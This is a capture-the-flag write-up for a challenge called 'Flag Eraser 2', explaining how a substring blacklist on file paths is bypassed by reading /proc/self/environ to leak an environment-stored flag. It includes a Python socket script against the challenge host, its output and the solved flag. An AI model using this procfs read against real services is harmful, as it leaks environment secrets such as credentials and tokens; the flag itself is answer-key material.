# Flag Eraser 2 Writeup

## Vulnerability
`chall.py` uses a substring blacklist on the raw user input:

```python
if any(keyword in filePath for keyword in BLACKLISTED_KEYWORDS):
    print('[-] Error: File path contains blacklisted keywords')
    continue
```

This is not a real sandbox. It still allows arbitrary readable paths, including procfs. The flag is exposed through `/proc/self/environ`, which contains process environment variables.

## Exploit idea
Read the process environment:

```text
/proc/self/environ
```

This bypasses the blacklist because none of the blocked substrings are present in that path.

## Reproduction

### Remote

1. Solve the proof-of-work.
2. Send `/proc/self/environ` to the service.

Example script:

```python
import socket, subprocess, re

host, port = 'challenge.hacktheflag.one', 30046
s = socket.create_connection((host, port), timeout=10)
banner = s.recv(4096).decode('latin1', errors='replace')
m = re.search(r'(s\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+)', banner)
challenge = m.group(1)
sol = subprocess.check_output(['/tmp/redpwnpowtest/redpwnpow', challenge], text=True).strip()
s.sendall((sol + '\n').encode())
s.recv(4096)
s.sendall(b'/proc/self/environ\n')
print(s.recv(8192).decode('latin1', errors='replace'))
s.close()
```

### Output

```text
[+] File content: FLAG=FYPCTF26{This_environment_is_full_of_flagsss}\x00
```

## Verified flag

`FYPCTF26{This_environment_is_full_of_flagsss}`

## Notes

- The bug is a blacklist bypass, not a path traversal into a normal file.
- `/proc/self/environ` is the smallest reliable pivot because it directly leaks the environment where the flag is stored.
